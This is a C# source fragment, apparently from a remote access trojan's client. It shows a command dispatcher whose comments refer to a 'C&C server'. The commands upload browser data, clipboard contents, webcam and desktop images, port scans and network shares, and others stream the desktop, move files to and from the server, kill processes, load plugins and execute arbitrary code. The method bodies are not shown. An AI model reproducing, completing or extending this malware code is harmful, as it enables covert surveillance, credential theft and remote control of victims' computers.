                    // probably not a zip file
                }
            }
            if (PluginHandler != null)
            {
                PluginHandler.Reload(null);
            }
        }

        public void ExecuteCommand(ECommand command)
        {
            switch (command)
            {
                case ECommand.SYSCMD_SHUTDOWN:
                    Shutdown();
                    break;
                case ECommand.SYSCMD_RESTART:
                    Restart();
                    break;
                case ECommand.SYSCMD_LOGOFF:
                    Logoff();
                    break;
                case ECommand.SYSCMD_LOCKCOMPUTER:
                    LockComputer();
                    break;
                case ECommand.SYSCMD_HIBERNATE:
                    LockComputer();
                    break;
                case ECommand.SYSCMD_SLEEP:
                    LockComputer();
                    break;
                case ECommand.UPLOAD_PORTSCAN:
                    UploadPortscan();
                    break;
                case ECommand.UPLOAD_GATEWAYS:
                    UploadGatewayInfo();
                    break;
                case ECommand.UPLOAD_LAN_COMPUTERS:
                    UploadLANComputers();
                    break;
                case ECommand.UPLOAD_SHARES:
                    UploadShares();
                    break;
                case ECommand.SET_TRANSMISSION_INTERVAL:
                    SetTransmissionInterval();
                    break;
                case ECommand.UPLOAD_IMAGE:
                    UploadDesktopImage();
                    break;
                case ECommand.EXECUTE_COMMAND:
                    ExecuteCommand();
                    break;
                case ECommand.UPLOAD_CLIPBOARD_DATA:
                    UploadClipboardData();
                    break;
                case ECommand.UPLOAD_WEBCAM_IMAGE:
                    UploadWebcamImage();
                    break;
                case ECommand.UPLOAD_PORT_INFO:
                    UploadPortInfo();
                    break;
                case ECommand.UPLOAD_PROCESS_INFO:
                    UploadProcessInfo();
                    break;
                case ECommand.UPLOAD_BROWSER_DATA:
                    UploadBrowserData();
                    break;
                case ECommand.UPLOAD_FILE_EVENTS:
                    UploadFileEvents();
                    break;
                case ECommand.DOWNLOAD_FILE:
                    // File retreived from C&C server
                    DownloadFile();
                    break;
                case ECommand.UPLOAD_FILE:
                    // File transmitted to C&C server
                    UploadFile();
                    break;
                case ECommand.STREAM_DESKTOP:
                    StreamDesktop();
                    break;
                case ECommand.STOP_STREAM_DESKTOP:
                    StopStreamDesktop();
                    break;
                //case ECommand.MOVE_CURSOR:
                //    CursorInteract();
                //    break;
                case ECommand.KILL_PROCESS:
                    KillProcess();
                    break;
                case ECommand.EXECUTE_PLUGIN:
                    ExecutePlugin();
                    break;
                case ECommand.KILL_PLUGIN:
                    RemovePlugin();
                    break;
                case ECommand.UPLOAD_PLUGIN:
                    UploadPlugin();
                    break;
                case ECommand.EXECUTE_CODE:
                    ExecuteCode();
                    break;
            }
        }
    }
}
